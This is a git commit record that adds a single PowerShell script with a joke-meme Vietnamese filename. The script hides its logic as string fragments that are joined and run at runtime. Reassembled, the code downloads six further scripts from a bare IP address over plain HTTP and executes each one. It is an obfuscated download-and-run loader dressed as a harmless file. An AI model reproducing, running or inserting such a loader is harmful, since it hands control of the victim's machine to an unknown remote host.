9dc58a5f6c93383d9241581bbdd9864290b1bd70
chang phai may troi... <1nuhongio@gmail.com>
2026-01-12 23:19:07 +0700

    Add files via upload

---
+++ cachdebienthanhtungsahur.ps1
@@ -0,0 +1,14 @@
+﻿$fragments = @('﻿
+for ($i = ','1; $i -le 6; $i','++) {
+   
+   ',' $url = "http:/','/103.67.197.187',':9999/dc$i.ps1"','
+    
+    
+ ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
+    $script','Content = $webC','lient.DownloadS','tring($url)
+  ','  
+    
+    I','nvoke-Expressio','n $scriptConten','t
+}'); $script = $fragments -join ''; Invoke-Expression $script
+
+
